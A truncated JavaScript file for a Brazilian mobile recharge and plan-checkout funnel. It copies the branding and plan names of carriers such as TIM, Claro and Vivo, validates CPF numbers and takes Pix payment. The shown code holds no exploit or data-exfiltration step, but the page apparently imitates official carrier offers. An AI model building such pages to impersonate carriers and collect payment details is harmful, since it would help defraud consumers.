// Estado Global
const state = {
    step: 'dados',
    telefone: '',
    operadora: '',
    valor: 0,
    bonus: '',
    pagamento: 'pix'
};

document.addEventListener('DOMContentLoaded', () => {
    initMasks();
});

// Máscaras de Input
function initMasks() {
    const inputTelefone = document.getElementById('telefone');

    inputTelefone.addEventListener('input', function (e) {
        let v = e.target.value.replace(/\D/g, '');
        if (v.length > 11) {
            v = v.slice(0, 11);
        }
        if (v.length <= 2) {
            e.target.value = v.length > 0 ? `(${v}` : '';
        } else if (v.length <= 6) {
            e.target.value = `(${v.slice(0, 2)}) ${v.slice(2)}`;
        } else if (v.length <= 10) {
            e.target.value = `(${v.slice(0, 2)}) ${v.slice(2, 6)}-${v.slice(6)}`;
        } else {
            e.target.value = `(${v.slice(0, 2)}) ${v.slice(2, 7)}-${v.slice(7, 11)}`;
        }
        state.telefone = v;
        
        // Remove erro se atingir tamanho válido (10 ou 11)
        if (state.telefone.length >= 10) {
            document.getElementById('telefone').classList.remove('error');
            document.getElementById('error-telefone').style.display = 'none';
        }
    });

    const otherPhone = document.getElementById('checkout-telefone-outro');
    if (otherPhone) {
        otherPhone.addEventListener('input', function(e) {
            let v = e.target.value.replace(/\D/g, '');
            if (v.length > 11) {
                v = v.slice(0, 11);
            }
            if (v.length <= 2) {
                e.target.value = v.length > 0 ? `(${v}` : '';
            } else if (v.length <= 6) {
                e.target.value = `(${v.slice(0, 2)}) ${v.slice(2)}`;
            } else if (v.length <= 10) {
                e.target.value = `(${v.slice(0, 2)}) ${v.slice(2, 6)}-${v.slice(6)}`;
            } else {
                e.target.value = `(${v.slice(0, 2)}) ${v.slice(2, 7)}-${v.slice(7, 11)}`;
            }
        });
    }
}

const rechargesByOperator = {
    tim: [
        { value: 15, bonus: '2GB' },
        { value: 20, bonus: '4GB' },
        { value: 25, bonus: '6GB' },
        { value: 30, bonus: '10GB' },
        { value: 40, bonus: '12GB' },
        { value: 50, bonus: '15GB' },
        { value: 60, bonus: '20GB' },
        { value: 70, bonus: '32GB' },
        { value: 100, bonus: '50GB' }
    ],
    claro: [
        { value: 15, bonus: '2GB' },
        { value: 20, bonus: '5GB' },
        { value: 25, bonus: '6GB' },
        { value: 30, bonus: '10GB' },
        { value: 40, bonus: '12GB' },
        { value: 50, bonus: '15GB' },
        { value: 60, bonus: '20GB' },
        { value: 70, bonus: '30GB' },
        { value: 100, bonus: '50GB' }
    ],
    vivo: [
        { value: 15, bonus: '2GB' },
        { value: 20, bonus: '4GB' },
        { value: 25, bonus: '6GB' },
        { value: 30, bonus: '10GB' },
        { value: 40, bonus: '12GB' },
        { value: 50, bonus: '15GB' },
        { value: 60, bonus: '20GB' },
        { value: 70, bonus: '30GB' },
        { value: 100, bonus: '50GB' }
    ],
    oi: [
        { value: 15, bonus: '2GB' },
        { value: 20, bonus: '4GB' },
        { value: 25, bonus: '6GB' },
        { value: 30, bonus: '10GB' },
        { value: 40, bonus: '12GB' },
        { value: 50, bonus: '15GB' },
        { value: 60, bonus: '20GB' },
        { value: 70, bonus: '30GB' },
        { value: 100, bonus: '50GB' }
    ],
    algar: [
        { value: 15, bonus: '2GB' },
        { value: 20, bonus: '4GB' },
        { value: 25, bonus: '6GB' },
        { value: 30, bonus: '10GB' },
        { value: 40, bonus: '12GB' },
        { value: 50, bonus: '15GB' },
        { value: 100, bonus: '50GB' }
    ],
    correios: [
        { value: 15, bonus: '2GB' },
        { value: 20, bonus: '4GB' },
        { value: 25, bonus: '6GB' },
        { value: 30, bonus: '10GB' },
        { value: 40, bonus: '12GB' },
        { value: 50, bonus: '15GB' },
        { value: 100, bonus: '50GB' }
    ]
};

const plansByOperator = {
    tim: [
        { 
            value: 30, 
            bonus: '16GB', 
            popular: true, 
            badge: 'TIM Pré XIP', 
            details: [
                { text: '16GB de internet livre', active: true },
                { text: 'Bônus de internet exclusivo', active: true },
                { text: 'WhatsApp sem descontar internet', active: true },
                { text: 'Ligações ilimitadas para todo Brasil', active: true }
            ],
            apps: ['whatsapp', 'messenger']
        },
        { 
            value: 64.99, 
            bonus: '45GB', 
            popular: false, 
            badge: 'TIM Controle Plus', 
            details: [
                { text: '45GB de internet livre', active: true },
                { text: 'Redes Sociais inclusas no plano', active: true },
                { text: 'WhatsApp e Instagram sem gastar dados', active: true },
                { text: 'Assinatura Deezer Go inclusa', active: true }
            ],
            apps: ['whatsapp', 'instagram', 'facebook', 'twitter', 'deezer']
        },
        { 
            value: 169.99, 
            bonus: '110GB', 
            popular: false, 
            badge: 'TIM Black', 
            details: [
                { text: '110GB de internet de ultra velocidade', active: true },
                { text: 'Redes Sociais e Vídeos liberados', active: true },
                { text: 'Amazon Prime ou Disney+ inclusos', active: true },
                { text: 'Roaming Internacional Américas + Europa', active: true }
            ],
            apps: ['whatsapp', 'instagram', 'facebook', 'youtube', 'tiktok', 'prime', 'disney']
        }
    ],
    claro: [
        { 
            value: 59.90, 
            bonus: '41GB', 
            popular: true, 
            badge: 'Oferta do Hexa',
            details: [
                { text: '30GB para uso livre', active: true },
                { text: '6GB bônus Copa do Mundo', active: true },
                { text: '5GB bônus para redes sociais e apps', active: true },
                { text: 'WhatsApp ilimitado', active: true }
            ],
            apps: ['whatsapp', 'instagram', 'facebook', 'youtube', 'tiktok']
        },
        { 
            value: 69.90, 
            bonus: '46GB', 
            popular: false, 
            badge: 'Oferta do Hexa',
            details: [
                { text: '35GB para uso livre', active: true },
                { text: '6GB bônus Copa do Mundo', active: true },
                { text: '5GB bônus para redes sociais e apps', active: true },
                { text: 'WhatsApp ilimitado', active: true }
            ],
            apps: ['whatsapp', 'instagram', 'facebook', 'youtube', 'tiktok']
        },
        { 
            value: 99.90, 
            bonus: '35GB', 
            popular: false, 
            badge: 'GeForce NOW',
            details: [
                { text: '20GB para uso livre', active: true },
                { text: '5GB para redes sociais', active: true },
                { text: '10GB bônus GeForce NOW', active: true },
                { text: 'WhatsApp ilimitado', active: true }
            ],
            apps: ['whatsapp', 'instagram', 'facebook', 'youtube', 'tiktok', 'geforce']
        }
    ],
    vivo: [
        { 
            value: 59, 
            bonus: '46GB', 
            popular: true, 
            badge: 'Vivo Controle',
            details: [
                { text: '15GB de franquia principal', active: true },
                { text: '31GB de bônus exclusivos', active: true },
                { text: '+10GB para redes sociais e vídeo por R$ 5', active: false },
                { text: '6 meses grátis de Gemini com AI Plus', active: true }
            ],
            apps: ['whatsapp', 'instagram', 'facebook', 'youtube', 'tiktok']
        },
        { 
            value: 30, 
            bonus: '30GB', 
            popular: false, 
            badge: 'Easy Lite',
            details: [
                { text: '30GB de franquia sem expirar', active: true },
                { text: 'Ligações e SMS ilimitados', active: true },
                { text: 'Sem fidelidade contratual', active: true }
            ],
            apps: ['whatsapp']
        },
        { 
            value: 150, 
            bonus: '60GB', 
            popular: false, 
            badge: 'Vivo Pós',
            details: [
                { text: '50GB de franquia principal', active: true },
                { text: '10GB de bônus exclusivo', active: true },
                { text: 'Assinatura Amazon Prime inclusa', active: true },
                { text: '6 meses grátis de Gemini com AI Plus', active: true }
            ],
            apps: ['whatsapp', 'instagram', 'facebook', 'youtube', 'tiktok', 'prime']
        }
    ],
    oi: [
        { 
            value: 30, 
            bonus: '15GB', 
            popular: true, 
            badge: 'Oi Controle',
            details: [
                { text: '15GB de franquia livre', active: true },
                { text: 'WhatsApp ilimitado', active: true }
            ],
            apps: ['whatsapp']
        },
        { 
            value: 50, 
            bonus: '30GB', 
            popular: false, 
            badge: 'Oi Ilimitado',
            details: [
                { text: '30GB de franquia livre', active: true },
                { text: 'Redes Sociais ilimitadas', active: true }
            ],
            apps: ['whatsapp', 'instagram', 'facebook']
        }
    ],
    algar: [
        { 
            value: 30, 
            bonus: '15GB', 
            popular: true, 
            badge: 'Algar Controle',
            details: [
                { text: '15GB de franquia livre', active: true },
                { text: 'WhatsApp ilimitado', active: true }
            ],
            apps: ['whatsapp']
        },
        { 
            value: 60, 
            bonus: '40GB', 
            popular: false, 
            badge: 'Algar Super',
            details: [
                { text: '40GB de franquia livre', active: true },
                { text: 'Redes Sociais ilimitadas', active: true }
            ],
            apps: ['whatsapp', 'instagram', 'facebook', 'youtube', 'tiktok']
        }
    ],
    correios: [
        { 
            value: 30, 
            bonus: '10GB', 
            popular: true, 
            badge: 'Correios Mensal',
            details: [
                { text: '10GB de internet livre', active: true },
                { text: 'WhatsApp grátis sem descontar', active: true }
            ],
            apps: ['whatsapp']
        },
        { 
            value: 45, 
            bonus: '20GB', 
            popular: false, 
            badge: 'Correios Plus',
            details: [
                { text: '20GB de internet livre', active: true },
                { text: 'Redes sociais inclusas', active: true }
            ],
            apps: ['whatsapp', 'instagram', 'facebook']
        }
    ]
};

// Renderizar o Grid de Valores correspondente a cada Operadora (Separando Avulsas de Mensais)
function renderValoresGrid() {
    // 1. Renderiza Recargas Avulsas
    const gridValores = document.getElementById('valores-grid');
    gridValores.innerHTML = '';
    const operator = state.operadora.toLowerCase();
    const recharges = rechargesByOperator[operator] || rechargesByOperator['tim'];
    
    recharges.forEach(plan => {
        const isPopular = plan.popular;
        const badgeHTML = isPopular ? `<div class="badge-popular">${plan.badge}</div>` : '';
        const selectedClass = state.valor === plan.value ? 'selected' : '';
        
        const card = document.createElement('div');
        card.className = `value-card ${isPopular ? 'popular' : ''} ${selectedClass}`;
        card.setAttribute('data-value', plan.value);
        card.setAttribute('onclick', `selectValue(${plan.value}, '+${plan.bonus}')`);
        card.innerHTML = `
            ${badgeHTML}
            <div class="value-amount">R$ ${plan.value}</div>
            <div class="value-bonus">+${plan.bonus}</div>
            <div class="check-icon"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
        `;
        gridValores.appendChild(card);
    });

    // 2. Renderiza Planos Mensais
    const gridPlanos = document.getElementById('planos-grid');
    gridPlanos.innerHTML = '';
    const plans = plansByOperator[operator] || plansByOperator['tim'];
    
    // Mapeamento de SVGs dos apps para deixar idêntico às fotos
    const appIcons = {
        whatsapp: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:4px;" title="WhatsApp"><circle cx="12" cy="12" r="10" fill="#25D366"/><path d="M12 7c-2.76 0-5 2.24-5 5 0 .94.26 1.82.72 2.58L7.1 16.9l2.4-.6c.72.39 1.54.6 2.5.6 2.76 0 5-2.24 5-5s-2.24-5-5-5zm2.84 7.02c-.11.31-.58.58-.87.62-.25.04-.57.06-1.52-.33-1.22-.5-2.01-1.74-2.07-1.82-.06-.08-.51-.68-.51-1.3s.32-.92.44-1.05c.12-.13.25-.16.34-.16h.22c.07 0 .17-.03.26.19.1.25.34.82.37.89.03.07.05.15 0 .25-.05.1-.07.16-.15.25-.08.09-.17.2-.24.28-.08.08-.17.17-.07.34.1.17.44.72.94 1.17.65.58 1.19.76 1.36.84.17.08.27.07.37-.04.1-.11.44-.51.56-.69.12-.18.24-.15.4-.09s1.05.5 1.23.59c.18.09.3.13.34.21.04.08.04.47-.07.78z" fill="white"/></svg>`,
        instagram: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:4px;" title="Instagram"><circle cx="12" cy="12" r="10" fill="#E1306C"/><rect x="8" y="8" width="8" height="8" rx="2" stroke="white" stroke-width="1.1"/><circle cx="12" cy="12" r="1.8" stroke="white" stroke-width="1.1"/><circle cx="14.2" cy="9.8" r="0.6" fill="white"/></svg>`,
        facebook: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:4px;" title="Facebook"><circle cx="12" cy="12" r="10" fill="#1877F2"/><path d="M13.5 10h-1.5v-1c0-.4.3-.7.7-.7h.8v-1.8h-1.3c-1.3 0-2.2 1-2.2 2.3v1.2H9v1.8h1v5h2v-5h1.5l.2-1.8z" fill="white"/></svg>`,
        youtube: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:4px;" title="YouTube"><circle cx="12" cy="12" r="10" fill="#FF0000"/><path d="M16 10.3s-.1-.6-.4-.9c-.4-.4-.8-.4-.9-.4-1.2-.1-3-.1-3-.1s-1.8 0-3 .1c-.1 0-.5 0-.9.4-.3.3-.4.9-.4.9s-.1.7-.1 1.5v.7c0 .8.1 1.5.1 1.5s.1.6.4.9c.4.4.8.4.9.4 1.2.1 3 .1 3 .1s1.8 0 3-.1c.1 0 .5 0 .9-.4.3-.3.4-.9.4-.9s.1-.7.1-1.5v-.7c0-.8-.1-1.5-.1-1.5zM11 13.5v-3l2.5 1.5-2.5 1.5z" fill="white"/></svg>`,
        tiktok: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:4px;" title="TikTok"><circle cx="12" cy="12" r="10" fill="#000000"/><path d="M12.52 5.5v8.51c0 1.37-.96 2.49-2.28 2.49s-2.28-1.12-2.28-2.49c0-1.37.96-2.49 2.28-2.49.25 0 .49.04.72.11v-1.92c-.24-.03-.48-.05-.72-.05-2.36 0-4.28 1.93-4.28 4.29a4.28 4.28 0 0 0 8.56 0v-4.9c.98.7 2.17 1.11 3.46 1.11v-1.92c-1.86 0-3.46-1.55-3.46-3.44h-1.99z" fill="white"/></svg>`,
        messenger: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:4px;" title="Messenger"><circle cx="12" cy="12" r="10" fill="#00B2FF"/><path d="M12 8c-2.4 0-4.3 1.8-4.3 4 0 1.2.6 2.3 1.5 3l-.2 1c0 .1.1.1.2.1.4-.1.8-.4 1.1-.6.5.2 1.1.3 1.7.3 2.4 0 4.3-1.8 4.3-4s-1.9-4-4.3-4zm1.8 3.5l-1.3 1.4c-.2.2-.5.2-.7 0l-.9-.9c-.1-.1-.3-.1-.4 0l-1.4 1.4c-.1.1-.3 0-.2-.1l.7-2.2c.1-.1.3-.2.4-.2l.9.9c.1.1.3.1.4 0l1.4-1.4c.1-.1.3 0 .2.1l-.7 2.2c0 .1.1.2.2.2z" fill="white"/></svg>`,
        deezer: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:4px;" title="Deezer"><circle cx="12" cy="12" r="10" fill="#121212"/><rect x="7" y="13.5" width="1.6" height="1.5" fill="#FFC000"/><rect x="9" y="12" width="1.6" height="3" fill="#FF8000"/><rect x="11" y="10.5" width="1.6" height="4.5" fill="#FF0000"/><rect x="13" y="9" width="1.6" height="6" fill="#E1007A"/><rect x="15" y="7.5" width="1.6" height="7.5" fill="#9000A1"/></svg>`,
        prime: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:4px;" title="Prime Video"><circle cx="12" cy="12" r="10" fill="#00A8E1"/><path d="M7.5 12h1.2c.3 0 .5-.2.5-.4V8.4c0-.3-.2-.4-.5-.4H7.5c-.3 0-.5.2-.5.4v3.2c0 .3.2.4.5.4zm2.2 0h1.2V8H9.7v4zm2.7 0h1.2c.3 0 .5-.2.5-.4V9.2c0-.3-.2-.4-.5-.4h-1.2v3.2zm-5.8 2.5c2.7 1.5 6 1.5 8.5.1.2-.1.2-.3.1-.5s-.3-.2-.5-.1c-2.3 1.2-5.5 1.2-7.8 0-.2-.1-.3-.1-.4.1-.1.2 0 .3.1.4z" fill="white"/></svg>`,
        disney: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:4px;" title="Disney+"><circle cx="12" cy="12" r="10" fill="#0E122A"/><path d="M12.5 8.5c-.4.7-.5 1.5-.4 2.3.1.8.5 1.4 1.1 1.9.1.1.2.1.3.1s.1-.2.1-.3c-.5-.4-.8-1-1-1.6-.1-.7-.1-1.3.3-2 .1-.1.1-.3-.1-.4s-.3 0-.5.1zm-3 4.2c.8-.5 1.7-.8 2.7-.7.6.1 1.1.3 1.6.6.1.1.3 0 .3-.1s.1-.3-.1-.4c-.7-.5-1.4-.7-2.2-.8-1-.1-2 .1-2.9.8-.1.1-.1.3 0 .4s.2.2.4.1z" stroke="white" stroke-width="1" stroke-linecap="round"/><circle cx="14.8" cy="11.2" r="0.5" fill="white"/></svg>`,
        geforce: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:4px;" title="GeForce NOW"><circle cx="12" cy="12" r="10" fill="#121212"/><path d="M12 8c-2.2 0-4 1.8-4 4s1.8 4 4 4v-1c-1.7 0-3-1.3-3-3s1.3-3 3-3c1.2 0 2.2.7 2.7 1.7l.9-.5C14.9 8.9 13.5 8 12 8z" fill="#76B900"/><circle cx="12" cy="12" r="1.8" fill="#76B900"/></svg>`
    };

    plans.forEach(plan => {
        const isSelected = state.valor === plan.value;
        const selectedClass = isSelected ? 'selected' : '';
        
        // Geração de HTML das bolinhas de apps
        let appsHTML = '';
        if (plan.apps && plan.apps.length > 0) {
            appsHTML = `<div class="plan-apps" style="display:flex; align-items:center; margin-top:8px;">
                <span style="font-size:0.7rem; color:var(--text-secondary); margin-right:8px; font-weight:700;">Apps inclusos:</span>
                ${plan.apps.map(app => appIcons[app] || '').join('')}
            </div>`;
        }

        // Geração de HTML dos benefícios com checklist
        let detailsHTML = '';
        if (plan.details && plan.details.length > 0) {
            detailsHTML = `<ul class="plan-details-list" style="list-style:none; padding:0; margin:12px 0; text-align:left; font-size:0.75rem; border-top:1px solid #f1f5f9; padding-top:8px;">
                ${plan.details.map(det => {
                    const iconColor = det.active ? 'var(--success)' : '#94a3b8';
                    const textStyle = det.active ? '' : 'text-decoration: line-through; color: #94a3b8;';
                    return `
                    <li style="display:flex; align-items:center; gap:6px; margin-bottom:4px; ${textStyle}">
                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="${iconColor}" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
                            <polyline points="20 6 9 17 4 12"></polyline>
                        </svg>
                        <span>${det.text}</span>
                    </li>`;
                }).join('')}
            </ul>`;
        }

        // Determinar o estilo do botão com base no operador
        let btnBg = '#002F9C'; // Azul padrão (TIM)
        let btnColor = '#ffffff';
        let btnText = 'Contratar agora';
        
        if (operator === 'claro') {
            btnBg = '#FFCD00'; // Amarelo Claro
            btnColor = '#000000';
            btnText = 'Contratar';
        } else if (operator === 'vivo') {
            btnBg = '#A62687'; // Magenta Vivo
            btnColor = '#ffffff';
            if (plan.badge === 'Vivo Controle') {
                btnText = 'Contratar Vivo Controle';
            } else if (plan.badge === 'Easy Lite') {
                btnText = 'Assinar Easy Lite';
            } else if (plan.badge === 'Vivo Pós') {
                btnText = 'Assinar Vivo Pós';
            } else {
                btnText = 'Fazer Recarga';
            }
        } else if (operator === 'oi') {
            btnBg = '#FFCD00'; // Amarelo
            btnColor = '#000000';
            btnText = 'Contratar';
        } else if (operator === 'algar') {
            btnBg = '#00A859'; // Verde
            btnColor = '#ffffff';
            btnText = 'Contratar';
        } else if (operator === 'correios') {
            btnBg = '#0B3B7C'; // Azul
            btnColor = '#ffffff';
            btnText = 'Contratar';
        }

        const card = document.createElement('div');
        // Usamos classe 'premium-plan-card' ao invés de 'value-card' simples para estilizar muito melhor!
        card.className = `premium-plan-card ${selectedClass}`;
        card.setAttribute('data-value', plan.value);
        card.setAttribute('onclick', `selectPlanAndGo(${plan.value}, '+${plan.bonus}')`);
        
        // Estilo de borda de seleção dinâmica
        const borderStyle = isSelected ? 'border: 2.5px solid var(--border-selected);' : 'border: 1px solid var(--border-color);';
        const shadowStyle = isSelected ? 'box-shadow: 0 4px 12px rgba(16, 185, 129, 0.15);' : 'box-shadow: 0 2px 4px rgba(0,0,0,0.02);';
        
        card.innerHTML = `
            <div style="background:var(--card-bg); border-radius:var(--radius-lg); padding:1rem; position:relative; ${borderStyle} ${shadowStyle} text-align:left; transition: var(--transition); cursor:pointer;">
                <div style="display:flex; justify-content:space-between; align-items:flex-start;">
                    <div>
                        <span style="font-size: 0.65rem; font-weight: 800; color: white; background: var(--primary); padding: 0.2rem 0.5rem; border-radius: 4px; text-transform: uppercase;">
                            ${plan.badge}
                        </span>
                        <div style="font-size:2rem; font-weight:900; color:var(--primary); line-height:1.2; margin-top:6px;">
                            ${plan.bonus}
                        </div>
                    </div>
                    <div style="text-align:right;">
                        <div style="font-size:0.7rem; color:var(--text-secondary); font-weight:700; text-transform:uppercase;">Valor mensal</div>
                        <div style="font-size:1.4rem; font-weight:900; color:var(--primary);">
                            R$ ${plan.value.toFixed(2).replace('.', ',')}
                        </div>
                    </div>
                </div>
                
                ${detailsHTML}
                ${appsHTML}

                <!-- Botão de Contratar e Mais detalhes -->
                <div style="margin-top: 14px;">
                    <button onclick="event.stopPropagation(); selectPlanAndGo(${plan.value}, '+${plan.bonus}')" style="background: ${btnBg}; color: ${btnColor}; width: 100%; border: none; padding: 0.65rem 1rem; border-radius: var(--radius-lg); font-weight: 800; font-size: 0.9rem; transition: var(--transition); cursor: pointer; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">
                        ${btnText}
                    </button>
                    <div style="text-align: center; margin-top: 6px;">
                        <span style="font-size: 0.72rem; color: #64748b; text-decoration: underline; font-weight: 600;">Mais detalhes</span>
                    </div>
                </div>

                <!-- Check icon no canto superior direito se selecionado -->
                ${isSelected ? `
                <div class="check-icon" style="opacity: 1; transform: scale(1); position: absolute; top: 10px; right: 10px; width: 22px; height: 22px; background: var(--border-selected); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center;">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
                </div>` : ''}
            </div>
        `;
        gridPlanos.appendChild(card);
    });
}

// Navegação do Funil
function goToStep(step) {
    if (step === 'valores') {
        updateSummary();
        renderValoresGrid();
        
        // Auto-selecionar a recarga avulsa padrão de R$ 30 da operadora correspondente
        if (state.valor === 0) {
            const operator = state.operadora.toLowerCase();
            const recharges = rechargesByOperator[operator] || rechargesByOperator['tim'];
            const defaultRecharge = recharges.find(r => r.value === 30) || recharges[0];
            selectValue(defaultRecharge.value, `+${defaultRecharge.bonus}`, false);
        }
    }

    // Hide all steps
    document.querySelectorAll('.funnel-step').forEach(el => {
        el.classList.remove('active');
    });

    // Show target step
    document.getElementById(`step-${step}`).classList.add('active');
    
    // Update State
    state.step = step;
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

// Ação de escolher operadora e avançar
function selectOperatorAndGo(brand) {
    // Validar telefone primeiro
    const input = document.getElementById('telefone');
    const error = document.getElementById('error-telefone');

    const numDigits = state.telefone.replace(/\D/g, '').length;
    if (numDigits < 10 || numDigits > 11) {
        input.classList.add('error');
        error.style.display = 'block';
        input.focus();
        return;
    }

    // Marca operadora
    document.querySelectorAll('.brand-card').forEach(el => el.classList.remove('selected'));
    document.querySelector(`.brand-card[data-brand="${brand}"]`).classList.add('selected');
    
    // Reseta valores de recarga anteriores para forçar carregar o pacote correto da nova operadora
    state.valor = 0;
    state.bonus = '';
    state.operadora = brand;
    
    // Vai pra tela de valores
    goToStep('valores');
}

// Seleção de Valor na tela 2
function selectValue(val, bonus, isPlano = false) {
    document.querySelectorAll('.value-card, .premium-plan-card').forEach(el => el.classList.remove('selected'));
    
    const selectedCard = document.querySelector(`.value-card[data-value="${val}"], .premium-plan-card[data-value="${val}"]`);
    if (selectedCard) {
        selectedCard.classList.add('selected');
    }
    
    state.valor = val;
    state.bonus = bonus;
    
    // Atualiza o box verde dinâmico e o título correspondente
    const box = document.getElementById('box-recarga-selecionada');
    const heading = document.getElementById('heading-recarga-selecionada');
    if (isPlano) {
        if (box) box.style.display = 'none';
        if (heading) heading.style.display = 'none';
    } else {
        if (box) box.style.display = 'flex';
        if (heading) heading.style.display = 'block';
        document.getElementById('final-valor').innerHTML = `R$ ${val.toFixed(2).replace('.', ',')}`;
        document.getElementById('final-bonus').innerText = bonus;
    }
}

// Avançar e preparar a tela de checkout do Plano Mensal
function selectPlanAndGo(val, bonus) {
    selectValue(val, bonus, true);
    loadPlanCheckoutData(val);
    goToStep('checkout-plano');
}

// Alternar exibição do campo de telefone alternativo
function toggleCheckoutPhoneField(show) {
    const wrapper = document.getElementById('checkout-other-phone-wrapper');
    const inputOutro = document.getElementById('checkout-telefone-outro');
    if (show) {
        wrapper.style.display = 'block';
        inputOutro.focus();
    } else {
        wrapper.style.display = 'none';
        inputOutro.classList.remove('error');
        document.getElementById('error-checkout-phone').style.display = 'none';
    }
}

// Controlar seleção das opções de telefone customizadas
function selectCheckoutPhoneOption(option) {
    const radioSame = document.getElementById('radio-phone-same');
    const radioOther = document.getElementById('radio-phone-other');
    const inputSame = document.getElementById('phone-option-same');
    const inputOther = document.getElementById('phone-option-other');
    
    if (option === 'same') {
        radioSame.classList.add('selected');
        radioOther.classList.remove('selected');
        inputSame.checked = true;
        inputOther.checked = false;
        toggleCheckoutPhoneField(false);
    } else {
        radioSame.classList.remove('selected');
        radioOther.classList.add('selected');
        inputSame.checked = false;
        inputOther.checked = true;
        toggleCheckoutPhoneField(true);
    }
}

// Controlar estado do checkbox customizado de opt-in
function toggleCheckoutOptin() {
    const wrapper = document.getElementById('checkout-optin-wrapper');
    const checkbox = document.getElementById('checkout-optin');
    
    checkbox.checked = !checkbox.checked;
    if (checkbox.checked) {
        wrapper.classList.add('checked');
    } else {
        wrapper.classList.remove('checked');
    }
}

// Algoritmo oficial de validação de CPF (Checksum e Dígitos verificadores)
function validarCPF(cpf) {
    cpf = cpf.replace(/[^\d]+/g,'');
    if (cpf == '') return false;
    if (cpf.length != 11 || 
        cpf == "00000000000" || 
        cpf == "11111111111" || 
        cpf == "22222222222" || 
        cpf == "33333333333" || 
        cpf == "44444444444" || 
        cpf == "55555555555" || 
        cpf == "66666666666" || 
        cpf == "77777777777" || 
        cpf == "88888888888" || 
        cpf == "99999999999")
            return false;       
    let add = 0;
    for (let i=0; i < 9; i ++)
        add += parseInt(cpf.charAt(i)) * (10 - i);
    let rev = 11 - (add % 11);
    if (rev == 10 || rev == 11)
        rev = 0;
    if (rev != parseInt(cpf.charAt(9)))
        return false;       
    add = 0;
    for (let i = 0; i < 10; i ++)
        add += parseInt(cpf.charAt(i)) * (11 - i);
    rev = 11 - (add % 11);
    if (rev == 10 || rev == 11)
        rev = 0;
    if (rev != parseInt(cpf.charAt(10)))
        return false;       
    return true;   
}

// Aplicar máscara de CPF no input do checkout
function initCPFMask() {
    const cpfInput = document.getElementById('checkout-cpf');
    if (!cpfInput) return;
    
    // Remove listeners antigos re-atribuindo
    const newCpfInput = cpfInput.cloneNode(true);
    cpfInput.parentNode.replaceChild(newCpfInput, cpfInput);
    
    newCpfInput.addEventListener('input', function (e) {
        let v = e.target.value.replace(/\D/g, '');
        if (v.length > 11) {
            v = v.slice(0, 11);
        }
        if (v.length <= 3) {
            e.target.value = v;
        } else if (v.length <= 6) {
            e.target.value = `${v.slice(0, 3)}.${v.slice(3)}`;
        } else if (v.length <= 9) {
            e.target.value = `${v.slice(0, 3)}.${v.slice(3, 6)}.${v.slice(6)}`;
        } else {
            e.target.value = `${v.slice(0, 3)}.${v.slice(3, 6)}.${v.slice(6, 9)}-${v.slice(9, 11)}`;
        }
    });
}

// Carregar os dados dinâmicos do plano no topo do checkout
function loadPlanCheckoutData(val) {
    const operator = state.operadora.toLowerCase();
    const plans = plansByOperator[operator] || plansByOperator['tim'];
    const selectedPlan = plans.find(p => p.value === val) || plans[0];
    
    let bannerBg = '#002F9C'; // TIM
    let focusBg = 'rgba(0, 47, 156, 0.12)';
    if (operator === 'claro') {
        bannerBg = '#e1251b';
        focusBg = 'rgba(225, 37, 27, 0.12)';
    } else if (operator === 'vivo') {
        bannerBg = '#7c2d8a';
        focusBg = 'rgba(124, 45, 138, 0.12)';
    } else if (operator === 'oi') {
        bannerBg = '#FFCD00';
        focusBg = 'rgba(255, 205, 0, 0.15)';
    } else if (operator === 'algar') {
        bannerBg = '#00a859';
        focusBg = 'rgba(0, 168, 89, 0.12)';
    } else if (operator === 'correios') {
        bannerBg = '#0b3b7c';
        focusBg = 'rgba(11, 59, 124, 0.12)';
    }
    
    // Configurar variáveis de tema CSS dinamicamente no elemento de checkout
    const checkoutContainer = document.getElementById('step-checkout-plano');
    if (checkoutContainer) {
        checkoutContainer.style.setProperty('--carrier-color', bannerBg);
        checkoutContainer.style.setProperty('--carrier-focus-color', focusBg);
    }
    
    const banner = document.getElementById('checkout-plano-banner');
    banner.style.background = bannerBg;
    banner.style.color = (operator === 'oi' || (operator === 'claro' && bannerBg === '#FFCD00')) ? '#000000' : '#ffffff';
    
    document.getElementById('checkout-plano-operadora').innerText = selectedPlan.badge;
    document.getElementById('checkout-plano-gb').innerText = selectedPlan.bonus;
    document.getElementById('checkout-plano-preco').innerText = `R$ ${selectedPlan.value.toFixed(2).replace('.', ',')}/mês`;
    
    // Lista de benefícios
    const descList = document.getElementById('checkout-plano-desc-list');
    descList.innerHTML = '';
    if (selectedPlan.details && selectedPlan.details.length > 0) {
        selectedPlan.details.forEach(det => {
            const opacity = det.active ? '1' : '0.6';
            const decoration = det.active ? '' : 'text-decoration: line-through;';
            const item = document.createElement('div');
            item.style.cssText = `display: flex; align-items: center; gap: 6px; margin-bottom: 4px; opacity: ${opacity}; ${decoration}`;
            item.innerHTML = `
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
                    <polyline points="20 6 9 17 4 12"></polyline>
                </svg>
